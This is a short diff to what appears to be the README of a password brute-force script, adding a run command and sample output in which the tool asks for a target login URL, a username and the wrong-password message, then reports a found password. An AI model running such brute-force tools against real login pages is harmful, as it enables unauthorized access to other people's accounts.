@@ -23,6 +23,12 @@ first create a
 passwords.txt
 ```
 # Usage
+run the script
+```
+$python bruteforce.py
+```
+result
+```
 Enter Target Url: :site.com/login
 Enter Target Username: admin12345
 Enter Wrong Password Error Message: testing123
@@ -30,4 +36,5 @@ Trying:123456
 Username: ---> admin123455
 Password: ---> 123456
 
-[Program finished]
+```
+
